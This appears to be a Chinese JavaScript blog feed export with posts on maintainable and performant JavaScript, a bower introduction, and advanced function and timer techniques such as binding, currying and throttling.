什么是可维护的代码可维护的代码有一些特征，一般来说，需要遵循以下特点： 可理解性，其他人可以接手代码并理解它的意图和一般途径，而需要开发人员的完整解释 直观性，代码中的东西一看就能明白，不管其操作过程多么复杂 可适应性，代码以一种数据上变化不要求完全重写的方法撰写 可扩展性，在代码架构上已考虑到在未来允许对核心功能进行扩展 可调试性，当出错时，代码可以给予足够的信息来尽可能直接的确定问题所在。 代码约定让代码变得可维护的简单途径是形成一套js代码的书面约定，绝大多数语言都开发出各自的代码约定，网上一搜就很多相关文档。比如专业组织为开发者指定了详细的代码约定让代码对任何人都可维护，优秀开源项目有着严格的代码要求，让社区的任何人偶可以轻松的理解代码是如何组织的。 由于js的可适应性，代码约定很重要，由于和大多数面向对象语言不同，js不强制开发人员将所有东西都定义为对象，语言可以支持各种编程风格，从传统面向对象式到声明式到函数式。不同的开源库就有可能使用不同的创建对象、定义方法、管理环境的方式。 可读性要让代码可维护，首先必须可读，可读性与代码作为文本文件的格式化方式有关，可读性的大部分内容都是和代码的缩进相关的，当所有代码缩进一致时整个项目中的代码才会更容易阅读。通常会使用若干空格而非制表符来进行缩进，因为制表符在不同的文本编辑器内显示效果不同，推荐4个空格。 可读性的另一方面是注释，在大多数编程语言中，对每个方法注释视为一个可行的实践，因为js可以在代码的任何地方创建函数，所以这点常常被忽略了，但正因为如此，在js中为每个函数编写文档就更重要了，一般而言，如下的地方需要进行注释： 函数和方法，每个函数或方法都需要一个注释，描述其目的和用于完成任务可能使用的算法，陈诉假设也非常作业，如参数代码什么，函数是否有返回值（因为不能从函数定义推断出来）。 大段代码，用于完成单个任务的多行代码应该在前面放一个描述任务的注释。 复杂算法，若使用了一个独特的方式解决问题，则要在注释中解释你是如何做的，这样不仅可帮助其他浏览代码的人，也方便下次自己查阅代码帮助理解。 Hack，因为存在浏览器差异，js代码一般会包含一些hack，不要假设其他人在查看代码时能够理解hack所解决的问题，那么将信息放在注释中，能减少别人误删改的情况。 缩进和注释都可以带来更可读的代码，在未来则更容易维护。 变量和函数命名适当给变量和函数起名字对于增加代码可读性和可维护性非常重要。命名的一般规则如下： 变量名应该是名词 函数名应该以动词开始，返回布尔值类型的函数一般以is开头 变量和函数都应使用合乎逻辑的名字，不用担心长度，长度问题可以通过后处理和压缩来缓解必须避免出现无法表示所包含的数据类型的无用变量名，有了合适的命名，代码阅读起来就像讲述故事一样，更容易理解。 变量类型透明由于js中变量是松散类型，很容易就忘记变量所应包含的数据类型，合适的命名方式可以一定程度上环境这个问题，但放到所有的情况下看，还不够，有三种表示变量数据类型的方式。 第一个是初始化，当定义了一个变量后，它应该初始化为一个值，暗示它将来应该如何应用，例如，将来保存布尔类型值的变量应该初始化为true或false，将来保存数字的变量初始化为一个数字。 初始化为一个特定的数据类型可以很好的指明变量的类型，但缺点是它无法用于函数声明中的函数参数。 第二种是使用匈牙利标记发来指定变量类型，即在变量名前加上一个或多个字符来表示数据类型。比如：o表示对象，s表示字符串，i表示整数，f表示浮点数，b表示布尔值。12var iCount = 1; // 整数var oPerson = &#123;&#125;; // 对象 好处是，函数参数一样可以使用，但缺点是让代码某种程度上难以阅读，阻碍了代码的直观性和句子式的特质。 最后一种指定变量类型的方式是使用类型注释，类型注释放在变量名右边，但在初始化前面，这种方式是在变量旁边放一段指定类型的注释：12var count /*:int*/ = 1; var person; /*:object*/ = null; 类型注释维持了代码整体的可读性，同时注入了类型信息，类型注释的缺点是你不能用多行注释依次注释大块的代码，因为类型注释也是多行注释，两者会冲突。 三种方式各有优缺点、可自行确定那种最适合项目并一致使用。 松散耦合只要应用的某个部分过渡依赖于另一部分，代码就是耦合过紧，难以维护，典型的问题如：对象直接引用另一个对象，并且当修改其中一个的同时需要修改另一个，紧密耦合的软件难以维护并且常常需要重写。 而Web所用的技术有多种情况会使它耦合过紧，必须小心，尽可能采用若耦合的方式： 解耦HTML/JS在Web中，HTML和js各自代表了解决方案中的不同层次，HTML是数据，js是行为，因为它们天生需要交互，所有有多种不同的方法将其关联起来，但一些方法会将HTML和js过于紧密的耦合在一起。比如直接写在HTML中的js，使用包含内联代码的script标签或使用html属性来分配事件处理程序。 当HTML和js过于紧密的耦合在一起时，出现js错误就要先判断错误是出现在HTML部分还是在js文件中，同时还会引入和代码是否可用的相关问题。而且对行为的修改需要同时触及HTML和js，因此影响了可维护性，而这些更改本该只在js中进行。 理想的情况下HTML和js应该完全分离，并通过外部文件和通过DOM注册行为来包含js。 HTML和js的紧密耦合也可以在相反的关系上成立，js包含HTML，通常是通过innerHTML插入HTML文本到页面上。 一般来说，应该避免在js中创建大量的HTML，HTML呈现应该尽可能与js分离，当用js插入数据时，尽量不要直接插入html标记，而是预先写好隐藏在页面内，使用js显示。 将HTML和js解耦可以在调试过程中节省时间，更容易定位错误，减轻维护难度。修改行为只在js中进行，更改标记只在渲染文件中。 解耦CSS/JS解耦CSS/JS常常是通过js修改样式类名（class名），而非直接修改样式本身，即只修改类名不修改样式信息，样式信息预先定义在class中。 由于IE中CSS可以通过表达式嵌入js，这会导致维护困难，所以避免使用这种方式。 解耦逻辑/事件处理程序Web一般都很相当多的事件处理程序、监听着无数的事件，但很难彻底将逻辑从事件处理程序分离，例如：123456789101112function handleKeyPress(event)&#123; event = EventUtil.getEvent(event); if(event.keyCode == 13)&#123; var target = EventUtil.getTarget(event); // 上面为事件处理，下面为应用逻辑 var value = 5 * parseInt(target.value); if(value &gt; 10)&#123; document.getElementById('errmsg').style.display = 'block'; &#125; &#125;&#125; 上例的事件处理程序除了包含应用逻辑，还进行了事件处理，这种方式的问题主要有2种：首先，除了通过事件之外就在没有方法执行应用逻辑，这样调试很困难，若没有发生预期的结果怎么办？是不是表示事件处理程序没有被调用还是指应用逻辑失败？其次，若一个后续的事件引发同样的应用逻辑，那么就必须复制功能代码或者将代码抽取到一个单独的函数中，但无论那种，都要做更多的改动。 较好的方法就是将应用逻辑和事件处理程序相分离，各自处理，一个事件处理程序应该从事件对象中提取相关信息，并将信息传递到处理应用逻辑的某个方法中。修改如下：12345678910111213141516// 事件处理function handleKeyPress(event)&#123; event = EventUtil.getEvent(event); if(event.keyCode == 13)&#123; var target = EventUtil.getTarget(event); validate(target.value); &#125;&#125;// 应用逻辑function validate(value)&#123; var value = 5 * parseInt(value); if(value &gt; 10)&#123; document.getElementById('errmsg').style.display = 'block'; &#125;&#125; 如此改动后，validate中没有任何东西会依赖事件处理程序的代码，它只接收一个值然后执行逻辑计算。 从事件处理程序中分离应用逻辑的好处如下： 更容易更改触发特定过程的事件，比如：若最开始由鼠标点击触发，但现在也需要按键触发，那么这样修改更容易。 可以在不附加到事件的情况下测试代码，使其更容易创建单元测试或自动化应用流程。 应用和业务逻辑之间松散耦合的原则如下： 勿将event对象传给其他方法，只传来自event对象中所需的数据 任何可以在应用层面的动作都应该可以在不执行任何事件处理程序的情况下进行 任何事件处理程序都只应该处理事件，然后将处理转交给应用逻辑。 其他实践技巧可维护的js并不仅仅是关于如何格式化代码，它还关系到代码做什么的问题，多人协作的情况下，应该确保每个人所使用的开发环境都一致，同时坚持一些好的编程实践： 尊重对象所有权js的动态性质使得几乎任何东西在任何时间都可以修改，虽然在ES5中通过引入防篡改对象得以改变，但模式情况下所有的对象都是可以修改的。 在开发时，尤其是开发大型项目时，最重要的编程实践之一就是尊重对象所有权，即，不能任意修改不属于自己的对象。简单的说就是若不负责创建或维护某个对象、对象的属性或方法，那么就不能对它们进行修改，更具体的说： 不要为实例或原型添加属性、方法 不要重定义已经存在的方法 所谓拥有对象，就是指对象是有你创建的，即一个自定义的类型或对象字面量，而Array、document的原生对象就不是你拥有的，但通过一些方法可以为原生对象或其他自定义对象创建新功能： 创建包含所需功能的新对象，并用它与相关对象进行交互 创建自定义类型，继承需要进行修改的类型，然后为自定义类型添加额外功能 避免全局变量与“尊重对象所有权”对应相关的就是尽可能避免全局变量和函数，同时也关系到创建一个脚本执行的一致并可维护环境，最多创建一个全局变量，让其他对象和函数存在其中。 单一的全局变量的延伸便是命名空间的概念，命名空间包括创建一个用于放置功能的对象，比如： YAHOO.util.Dom 处理DOM的方法 YAHOO.util.Event 与事件交互的方法 YAHOO.lang 用于底层语言特性的方法 对于YUI，单一的全局对象YAHOO作为一个容器，其中定义了其他对象，用这种方法将功能组合在一起的对象就叫命名空间。 命名空间重要的就是确定每一个人都统一并唯一使用，大多数可用公司名字或项目名，比如YAHOO、Wrox。 避免与null进行比较由于js不做任何自动类型检查，所以检查类型就成为很多代码执行前必须的工作，常见的就是查看某值是否为null，但直接与null比较却有问题，比如：123if(value != null)&#123; // value是一个数组 value.sort(); // ...&#125; 上述的代码问题就是仅仅检查value是否为null，无法避免value为其他非数组类型，以及sort为undefined的错误。应该使用instanceof检测123if(value instanceof Array)&#123; //...&#125; 一般来说，类型检测或容错检测有如下原则： 检测一个引用类型，用instanceof检测其构造函数 检测一个基本类型，用typeof检测 若希望对象包含某特定方法，则用typeof确保指定名字的方法存在对象上 使用常量尽管js没有常量的概念，但不可否则常量非常重要，而且有用，即将数据从应用逻辑分离出来的思想，可以在不引入错误的风险下改变数据。比如错误提示，就应该按照将提示信息抽离出来。 将数据和使用逻辑分离的原则如下： 重复值 —— 任何在多处用到的值都应该抽取为一个常量，避免值的多次修改和不一致 用户界面字符串 —— 任何用于显示给用户的字符串，都应该抽取出来以方便国际化 URL —— 在Web应用中，资源的位置很容易改变，所以应该在一个公共的地方存放所有的URL 任意可能会更改的值 —— 每当用到字面量时，都要考虑是否在将来会被修改。若不会修改则可以作为常量 性能由于js本身是解释性语言，执行的速度要比编译型语言慢，而现代浏览器（由Chrome开启的）内置优化引擎，将js编译为本地代码再执行，陆续实现了js的编译执行，但代码若本身低效则任何优化都是没用的。所以应该采用一些方法来改进代码的整体性能。 注意作用域随着作用域链中的作用域数量的增加，访问当前作用域以外的变量的时间也在增加，访问全局变量总是要比访问局部变量慢，因为需要遍历作用域链，只要能减少花在作用域链上的时间，就能增加整体性能。 避免全局查找优化脚本性能最重要的就是注意全局查找，使用全局变量和函数肯定比局部变量开销大，因为会涉及作用域链的查找。比如对document，就可以用一个局部变量来引用，然后用局部变量代替document。 避免with语句在性能上需要特别注意的就是避免使用with语句，因为with语句会创建自己的作用域，因此会增加其中执行的代码的作用域链的长度。 而with语句主要的用途是消除额外的字符，大多数情况下，可以用局部变量代替。 选择正确方法和其他语言一样，性能与解决方法/算法是相关的，所以一些通用的优化策略也是可以在js中使用的。 避免不必要的属性查找按照算法复杂度来看，O(1)操作性能是最佳的，比如读写字面量、数组、变量中的值。但读写对象上的属性和方法则是一个O(n)操作，所以要注意多重属性查找，比如：12345// 6次属性查找window.location.href.substring(window.location.href.infexOf('?'));// 改进如下，只有4次属性查找，优化33%var href = window.location.href;href.substring(href.infexOf('?')) 一般的，尽量用局部变量代替属性查找是，能用数组进行方法则用数组方式。 优化循环循环是编程中最常见的结构之一，优化循环的基本步骤如下： 减值迭代 —— 一般循环使用0作为起始，但从最大值开始迭代更高效 简化终止条件 —— 由于每次循环都会计算终止条件，所以必须保证尽快能快的计算出终止条件，即避免属性查找或其他O(n)的操作 简化循环体 —— 循环体是执行最多的，所以要最大限度优化它，尽量确保没有复杂计算 使用后测试循环 —— for和while循环都是前测试循环，而do-while则属性后测试循环，可以避免最初计算终止条件，因此能运行更快比如一个普通的for循环的改进：12345678910for(var i = 0; i &lt; values.length; i++)&#123; process(values[i]);&#125;// 改进如下var i = values.length - 1;if(i &gt; -1)&#123; do&#123; process(values[i]); &#125;while( --i &gt;= 0);&#125; 主要优化的是将终止条件和自减操作符组合成了单个语句。“后测试”循环时必须确保要处理的值至少有一个，空数组会导致多余的一次循环而“前测试”循环则可以避免。 展开循环当循环的次数是确定的，消除循环并使用多次函数调用往往更快，这样展开循环可以消除建立循环和处理终止条件的额外开销，使代码运行更快，比如直接连续执行3次process比for循环3次要快。 若循环迭代次数事先无法确实，有一个Duff的概念可以将循环展开提高效率（以8为倍数执行）：1234567891011121314151617181920var iterations = Math.floor(values.length / 8);var leftover = values.length % 8;var i = 0;if(leftover &gt; 0)&#123; do&#123; process(values[i++]); &#125;while(--leftover &gt; 0);&#125;do&#123; process(values[i++]); process(values[i++]); process(values[i++]); process(values[i++]); process(values[i++]); process(values[i++]); process(values[i++]); process(values[i++]);&#125;while(--iterations &gt; 0); 这样剩余的计算部分不会在实际循环中处理，而是在一个初始化循环中进行除以8的操作，当处理掉了额外的元素，执行每次调用8次process的主循环。 此Duff对大数据集有效，但对小数据集的额外开销则可能得不偿失。 避免双重解释当用js代码解析js的时候会存在双重解析的问题，比如eval函数或Function构造函数以及使用setTimeout传一个字符串参数时都会发生这种情况。 这些操作都需要解析包含js代码的字符串，而且不能在初始的解析过程中完成，因为代码是包含在字符串中的，即js代码运行的同时必须新启动一个解析器来解析新的代码，实例化一个新的解析器的开销比直接解析要大很多，也慢的多。 其他与性能有关的注意事项除了以上的几点外，还有一些非主要的问题，但使用得当也能提升很多性能 原生方法较快 —— 原生方法是用C/C++之类的编译型语言写的，所以要比js快很多，js中最容易忘记的就是可以在Match对象中的复杂数学运算，这些方法比用js写的同样的方法快很多。 Switch较快 —— 若有一些列复杂的if-else语句，可转换为单个switch，还可以通过将case语句按照最可能用到的顺序进行组织，进一步优化switch语句。 位运算符较快 —— 当进行数学运算时，位运算操作要比任何布尔运算或算数运算快，比如模、与、或等都可以用位运算代替。 最小化语句数js代码中的语句数量也影响所执行的操作的速度，完成多个操作的单个语句要比完成单个操作的多个语句快，所以要找出可以组合在一起的语句，以减少脚本整体的执行时间。 多个变量声明 —— 声明变量时只用一个var 插入迭代值 —— 当使用迭代值时，尽可能合并语句，比如value[i++] 使用数组和对象字面量 —— 相比使用构造函数创建对象和数组，直接使用字面量的方式可以将操作在一个语句内完成 优化DOM交互js中，DOM操作是最慢的，因为它们往往要重新渲染整个页面或某一部分，而且由于DOM要处理非常多的信息，所以看似很小的操作开销却不小。理解如何优化DOM操作可以极大提高脚本完成的速度。 最小化现场更新现场更新的意思是，需要立即（现场）对页面中的显示进行更新。每一个更改，不管是插入字符，还是移除标签，都有较大的开销，因为浏览器要重新计算很多以进行更新。 一般采用的策略为使用文档片段来构建DOM，然后再一次性添加到文档中。 使用innerHTML对于大的DOM更改，使用innerHTML比标准的DOM方法（createElement，appendChild）创建同样的DOM结构快。 当将innerHTML设置为某个值时，后台会创建一个HTML解析器，然后使用内部的DOM调用来创建DOM结构，而非基于js的DOM调用，由于内部方法是编译后执行的代码，所以执行快得多。 使用事件代理大多数Web应用都有大量的事件处理程序，页面上的事件处理程序的数量和页面响应用户交互的速度成反比，事件代理的原理是由于事件冒泡，高层的节点能处理多个目标的事件。 注意HTMLCollectionHTMLCollection对象的问题在于查询开销非常大，所以需要限制使用。 首先一定要知道那些方法会返回HTMLCollection： getElementsByTagName方法 元素对象的childNodes属性 元素对象的attributes属性 访问特殊的集合，如document.forms, document.images等 一般来说在内部循环或函数执行时，用局部变量替代属性查询会非常有用。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"bower入门使用","slug":"bower","date":"2016-09-18T13:40:53.000Z","updated":"2016-09-18T13:40:53.000Z","comments":true,"path":"2016/09/18/bower/","link":"","permalink":"https://github.com/xmoyKING/2016/09/18/bower/","excerpt":"","text":"参考自：bower解决js的依赖管理 使用npm install -g bower安装bower 然后使用bower --help可以查看帮助信息123456789101112131415161718192021222324252627282930313233343536Usage: bower &lt;command&gt; [&lt;args&gt;] [&lt;options&gt;]Commands: cache Manage bower cache help Display help information about Bower home Opens a package homepage into your favorite browser info Info of a particular package init Interactively create a bower.json file install Install a package locally link Symlink a package folder list List local packages - and possible updates login Authenticate with GitHub and store credentials lookup Look up a single package URL by name prune Removes local extraneous packages register Register a package search Search for packages by name update Update a local package uninstall Remove a local package unregister Remove a package from the registry version Bump a package versionOptions: -f, --force Makes various commands more forceful -j, --json Output consumable JSON -l, --loglevel What level of logs to report -o, --offline Do not hit the network -q, --quiet Only output important information -s, --silent Do not output anything, besides errors -V, --verbose Makes output more verbose --allow-root Allows running commands as root -v, --version Output Bower version --no-color Disable colorsSee 'bower help &lt;command&gt;' for more information on a specific command. .bowerrc 作为bower的配置文件，比如配置bower目录123&#123; \"directory\": \"app/bower_components\"&#125; 使用bower init可以根据引导新建一个bower.json文件，内部配置了项目的信息,比如：12345678910111213141516171819202122&#123; \"name\": \"ng1-express4\", \"description\": \"\", \"main\": \"\", \"authors\": [ \"xmoyking &lt;xmoyking@gmail.com&gt;\" ], \"license\": \"MIT\", \"homepage\": \"\", \"ignore\": [ \"**/.*\", \"node_modules\", \"bower_components\", \"test\", \"tests\" ], \"dependencies\": &#123; \"angular\": \"~1.2.12-build.2226\", \"angular-route\": \"~1.2.12-build.2226\", \"bootstrap\": \"^3.3.7\" &#125;&#125; 除了基本的使用之外，bower的管理依赖能帮助解析库与库之间的关系。 也可以在github上发布自己的包，让其他人也能使用这个包，按照流程一步一步做就可以了。 吐槽一波，bower安装东西实在太慢，不知道是网速问题还是什么问题","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"bower","slug":"bower","permalink":"https://github.com/xmoyKING/tags/bower/"}]},{"title":"JavaScript高级程序设计-25-高级技巧","slug":"js-pro25","date":"2016-09-17T01:36:39.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/17/js-pro25/","link":"","permalink":"https://github.com/xmoyKING/2016/09/17/js-pro25/","excerpt":"","text":"js是一种非常灵活的语言，具有多种使用风格，由于天生的动态属性，还能使用非常复杂和有趣的模式。 高级函数函数是js中最有趣的部分之一，本质非常简单和过程化，但通过语言特性能实现一些非常强大的功能。 安全的类型检查由于js内置的类型检测机制不是非常完美，尤其是与浏览器的实现相关，比如：typeof操作符的返回值就受浏览器影响、instanceof操作也存在多个全局作用域的情况的问题，当检查某个对象到底是原生对象还是自定义的对象的时候也有问题，而在Web开发中，能够区分原生与非原生对象非常重要。因此，想要安全的检测类型，直接提供的原生手段不足以完成，但js中的Object的toString方法提供了这种可能，因为该方法会返回一个表示构造函数名的字符串。12var value = [];Object.prototype.toString.call(value); // [object Array] 作用域安全的构造函数一个构造函数必须使用new操作符才能正常创建并返回一个新对象实例。当使用new调用构造函数时，构造函数内用到的this对象会指向新创建的对象实例。而若不使用new直接调用则this会被映射到全局对象window上，因为this对象是在运行时绑定的，这样的后果有可能会导致window中属性被覆盖而出错。 而解决此问题的方法就是创建一个作用域安全的构造函数，即，在进行创建/修改对象前，先确定this对象 是否为正确类型的实例，若不是则创建新的实例返回。12345678910111213function Person(name)&#123; if(this instanceof Person)&#123; this.name = name; &#125;else&#123; return new Person(name); &#125;&#125;var p1 = new Person('king');p1.name; // kingvar p2 = Person('tom');p2.name; // tomwindow.name; //undefined 如此，上述代码无论在调用Person构造函数时是否用new操作符，都会返回一个Person的新实例，避免了在全局对象上意外设置/修改属性。 但这样锁定构造函数的环境后就无法使用构造函数窃取模式的继承了:123456789101112131415function Person(name)&#123; if(this instanceof Person)&#123; this.name = name; &#125;else&#123; return new Person(name); &#125;&#125;function Doctor(name, age)&#123; Person.call(this, name); this.age = age;&#125;var p1 = new Doctor('king', 21);p1.name; // undefined 因为Doctor构造函数中，此时的this不是Person的实例，Person的构造函数返回的是一个新的Person实例，所以新创建的Doctor中的this作用域并没有能继承到Person中的name属性，而Person.call(this, name);返回的新实例也没有被用到。 但上述够战术窃取模式的问题可以通过原型链解决，将Doctor构造函数的显式原型设置为Person的实例即可：123Doctor.prototype = new Person();var p1 = new Doctor('king', 21);p1.name; // king 惰性载入函数所谓的惰性载入函数是为解决一些函数执行需要做if-else判断语句用于判断执行环境，能力检测等，而这些判断完全可以只在初始执行依次的判断，但这些函数每次执行都会大量冗余重复的判断环境，这些测试都是没必要的。解决方法就是惰性载入技术。 惰性载入表示函数执行分支仅会发生依次，有2种实现惰性载入的方式，第一种是在函数被调用时在处理函数，在第一次调用的过程中，该函数会被覆盖为另一个按合适方式执行的函数，这样任何对原函数的调用都不用在经过执行的分支了。例如下面创建XHR的函数，在第一次执行完成后就不会在进行if-else的能力判断了：1234567891011function createXHR()&#123; if(typeof XMLHttpRequest != 'undefined')&#123; createXHR = function()&#123; return new XMLHttpRequest(); &#125;; &#125;else&#123; createXHR = function()&#123; throw new Error('no XHR object available'); &#125;; &#125;&#125; 第二种实现的方式是在声明函数时就指定适当的函数，这样，第一次调用函数是就不会损失性能，而在代码首次加载时会损失一点性能,比如使用一个自执行的匿名函数用于确定该使用哪个函数实现：1234567891011var createXHR = (function()&#123; if(typeof XMLHttpRequest != 'undefined')&#123; return function()&#123; return new XMLHttpRequest(); &#125;; &#125;else&#123; return function()&#123; throw new Error('no XHR object available'); &#125;; &#125;&#125;)() 两种方式都非常有用，而那种方式更好取决于具体需求。 函数绑定函数绑定指的是在特定的this环境中指定参数调用另一个函数，这种技巧常常和回调函数与事件处理程序一起使用，以便将函数作为变量传递的同时保留代码执行环境。12345678var handler = &#123; msg: 'handled', handleClick: function(event)&#123; console.log(this.msg); &#125;&#125;var btn = document.getElementById('myBtn');EventUtil.addHandler(btn, 'click', handler.handleClick); // undefined 上述代码之所以执行addHandler绑定后的handler.handleClick会输出undefined是由于handler.handleClick的执行环境没有保存，因为btn在被点击时，this指向了DOM而非handler对象。 可以用闭包解决执行环境保存的问题：123EventUtil.addHandler(btn, 'click', function(event)&#123; handler.handleClick(event);&#125;); // handled 闭包中直接调用handler.handleClick(event);这样handleClick的执行环境为handler对象，所以最后输出handled。但闭包也有缺点，即难于理解和调试。因此很多js库都实现了可以将函数绑定到指定环境的函数，即bind函数（ES5也原生支持此方法了）。12345function bind(fn, context)&#123; return function()&#123; return fn.apply(context, arguments); &#125;&#125; 在bind函数中创建一个闭包，闭包使用apply调用传入的fn函数，并给apply传递context对象和内部函数的arguments参数，这样当调用返回的函数时，它会在给定的context环境中执行fn函数并使用传入的所有参数。1EventUtil.addHandler(btn, 'click', bind(handler.handleClick, handler)); // handled ES5的原生方式类似，而且是作为函数的方法,支持此方法的浏览器有IE9+、Firefox4+、Chrome：1EventUtil.addHandler(btn, 'click', handler.handleClick.bind(handler)); // handled 只要是将某个函数指针以值的形式进行传递，同时该函数必须在特定环境中执行，被绑定函数的效用就凸显出来了，它们主要用于事件处理程序以及定时器，然而，被绑定函数与普通函数相比有更多开销，需要更多内存，同时也因为多重函数调用导致稍微慢一些，所以最好仅在必要时使用。 函数柯里化与函数绑定的紧密相关主题是函数柯里化（function currying）,它用于创建已经设置好了一个或多个参数的函数，函数柯里化基本方法和函数绑定是一样的，使用一个闭包返回一个函数，两者的区别在于，当函数被调用时，返回的函数还需要设置一些传入的参数：1234567891011121314151617181920212223function curry(fn, context)&#123; var args = Array.prototype.slice.call(arguments, 2); return function()&#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return fn.apply(context, finalArgs); &#125;&#125;// 不需要绑定执行上下文，调用function add(n1, n2)&#123; return n1 + n2;&#125;var curriedAdd = curry(add, null, 5); // 由于不需要绑定执行上下文，所以传入null// 需要绑定执行上下文，调用var handler = &#123; msg: 'handled', handleClick: function(name, event)&#123; console.log(name, this.msg); &#125;&#125;EventUtil.addHandler(btn, 'click', curry(handler.handleClick, handler, 'my-btn')); // my-btn, handled curry函数的主要工作就是将返回函数的参数进行排序，第一个参数是要进行柯里化的函数，第二个参数为要绑定的上下文执行环境，其他参数为要传入的值，为了获取第二个参数后的所有其他参数，在arguments对象上调用slice方法，并传入2表示将返回的数组包含从第二个参数开始的所有参数，然后args数组包含了来自外部函数的参数。在内部函数中创建了innerArgs数组用来存所有传入的参数，有了存放来自外部和内部函数和的参数数组后，就可以使用concat方法将它们组合为finnalArgs，然后用apply方法将结果传递给该函数。 ES5的bind方法也实现了柯里化，只要在this的值后在传入其他参数即可。1EventUtil.addHandler(btn, 'click', handler.handleClick.bind(handler, 'my-btn')); // my-btn, handled 防篡改对象ES5可以自定义防篡改对象（tamper-proff object）,主要为了防止以外修改代码或用不兼容的功能重写原生对象。 涉及到对象属性的[[Confrigurable]]、[[Writable]]、[[Enumerable]]、[[Value]]、[[Get]]、[[Set]]特性，而一旦将对象定义为防篡改对象就无法撤销。 同时，一般在非严格模式下非法操作会忽略，严格模式下会报错。 不可扩展对象ES5为对象定义的第一个保护级别。 默认情况下，所有对象都是可扩展的，即任何时候都可以向对象中添加属性和方法，通过Object.preventExtensions(obj)方法可以改变这个行为，执行此方法后就无法给obj对象添加属性和方法了，但仍然可以修改和删除已有成员。Object.isExtensible()方法可以确定对象是否可扩展。 密封的对象ES5为对象定义的第二个保护级别。通过Object.seal(obj)密封某个对象。Object.isSealed()用于检测对象是否被密封。 密封对象（sealed object）不可扩展而且已有成员的[[Confirgurable]]特性会被设置为false，即无法使用Object.definedProperty()把数据属性修改为访问器属性，也就无法删除属性和方法了。但属性值可修改。 被密封的对象不可扩展，所以isExtensible方法返回false，isSealed返回true。 冻结的对象冻结对象（frozen object）是最严格的防篡改级别，冻结的对象既不可扩展，又是密封的，而且对象属性的[[Writable]]特性会被设置为false，若定义[[Set]]函数，则访问器属性仍然可写的。 ES5定义Object.freeze()方法用来冻结对象。用Object.isFrozen()检测冻结对象。 高级定时器使用setTimeout和setInterval创建的定时器可以用于实现一些有用的功能，由于js是运行于单线程的环节中，而定时器仅仅只是计划在未来的某个时间执行，执行时机不能保证，因为页面在生命周期内，不同时间可能有其他代码在控制js进程。页面下载完后的代码运行、事件处理程序、Ajax回调函数都必须使用同样的线程来执行。实际上，浏览器负责进行调度和排序、指派某段代码在某个时间点运行的优先级。 将js想象成在时间上运行，当页面载入时，首先执行的是任何包含在script元素中的代码，通常是页面生命周期后面要用到的一些简单的函数和变量的声明，不过有时候也包含一些初始数据的处理，在此之后，js进程将等待更多代码执行。当进程空闲时，下一个代码会被立刻触发并立即运行。例如，当点击按钮时，只要js进程处于空闲状态，则onclick事件处理程序会立刻执行。 除了主js执行进程外，还有一个需要在进程下一次空闲时执行的代码队列，随着页面在其生命周期中的推移，代码会按照执行顺序添加到队列中，例如，当按下按钮，它的事件处理程序代码会被添加到队列中，并在下一个可能的时间执行。当接收到ajax响应时，回调函数的代码会被添加到队列中。在js中没有任何代码是立刻执行的，但一旦进程空闲则尽快执行。 定时器对队列的工作方式为当特定时间过去后将代码插入，注意，给队列添加代码并不意味立刻执行代码，而只能表示它会尽快执行。比如，设定一个150ms后执行的定时器不代表到150ms时立刻执行，它仅仅表示代码会在150ms后被加入到队列中。若在这个时间点上，队列中没有其他东西，那么这段代码就会被执行，表面上看上去好像代码就在精确指定的时间点上执行了。其他情况下则有可能等待更长的时间才执行。 重复定时器使用setInterval创建的重复定时器能周期性的插入代码到队列中，但问题在于，重复定时器代码可能在代码再次被添加到队列之前还没完成，结果就会导致重复定时器代码连续允许好几次而之间没有间隔。js引擎对此进行了优化，避免此问题，即当使用重复定时器时，仅当没有该定时器的任何其他代码实例时，才将定时器代码添加到队列中，这样确保定时器代码加入到队列中的最小时间间隔为指定间隔。 但还有有问题，比如某些间隔可能会被跳过，又比如多个定时器的代码执行之间的间隔可能会比预期的小。 为了避免重复定时器的问题，考虑使用setTimeout模拟替代setInterval。没次函数执行的时候会创建一个新的计时器，这样的好处是在前一个定时器代码执行之前，不会向队列插入新的定时器代码，确保不会有任何缺失的间隔，而且可以保证在下一次定时器代码执行之前，至少要等待指定的间隔，避免连续的运行。 Yielding processes脚本运行时间长通常有2种原因，一是过长过深的嵌套调用，一是进行大量计算或处理的循环。因为js的执行是阻塞操作，脚本运行越长，用户无法与页面交互的时间就越长。 若是第二种循环的情况，同时既不需要同步完成，也不需要按照指定顺序完成，那么可以考虑使用是定时器将循环分割，这种技术叫数组分块（array chunking），小块小块的处理数组。基本思路就是为要处理的项目建立一个队列，然后使用定时器取出下一个要处理的项目进行处理，然后接着再设置另一个定时器。 数组分块的好处在于它可以将多个项目的处理在执行队列上分开，在每个项目处理之后，给与其他浏览器处理机会运行，这样就可能避免长时间运行脚本的错误。 函数节流浏览器中某些计算和处理要比其他的昂贵很多，比如过多DOM操作甚至会导致浏览器崩溃。又比如onresize、onscroll等事件，高频的连续触发也可能导致浏览器崩溃。为了绕开此问题，可以使用定时器对函数进行节流。 函数节流的思想是让代码不在没有间隔的情况下连续重复执行。第一次调用函数，创建一个定时器，在指定的时间间隔之后运行代码，当第二次调用该函数时，它会清除前一次的定时器并设置另一个，若前一个定时器已经执行过了，则忽略操作，若前一个定时器尚未执行，那么将其替换为一个新的定时器。目的就是只有在执行函数的请求停止了一段时间之后才执行。123456789101112131415161718192021222324252627282930313233var processor = &#123; timeoutId: null, performProcessing: function()&#123; // 实际进程处理的代码 // ... &#125;, process: function()&#123; // 初始调用方法 clearTimeout(this.timeoutId); var that = this; this.timeoutId = setTimeout(function()&#123; that.proformProcessing(); &#125;, 100) &#125;&#125;processor.process(); // 开始执行// 上述代码可简化如下：function throttle(method, context)&#123; clearTimeout(method.tId); method.tId = setTimeout(function()&#123; method.call(context); &#125;, 100);&#125;// 使用function resizeDiv()&#123; // ... div.style.height = div.offsetWidth + 'px';&#125;window.onresize = function()&#123; throttle(resizeDiv);&#125; 自定义事件事件是js与浏览器交互的主要途径，事件是一种叫观察者模式的设计模式，该模式能创建松散耦合的代码。对象可以发布事件，用来表示在该对象生命周期中某个确定时刻到达，然后其他对象可以观察该对象，等待这些时刻到达并运行代码来响应。 